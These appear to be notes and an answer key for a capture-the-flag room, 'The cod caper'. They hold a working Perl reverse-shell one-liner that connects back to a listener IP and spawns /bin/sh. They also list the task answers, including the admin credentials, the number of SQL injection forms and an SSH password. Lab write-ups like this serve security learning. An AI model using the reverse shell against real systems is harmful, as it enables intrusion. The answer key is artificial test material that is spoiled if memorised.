# The cod caper

```
export IP=10.10.11.225
```

# Material needed

1. Interesting directory: /administrator.php

2. PHP reverse shell

```
perl -e 'use Socket;$i="10.8.193.113";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

# Tasks

1. How many ports are open on the target machine? 2

2. What is the http-title of the web server? Apache2 Ubuntu Default Page: It works

3. What is the version of the web server? Apache/2.4.18

4. What is the name of the important file on the server? administrator.php

5. What is the admin username? pingudad

6. What is the admin password? secretpass

7. How many forms of SQLI is the form vulnerable to? 3

8. How many files are in the current directory? 3

9. Do i still have an account? yes

10. What is my ssh password? pinguapingu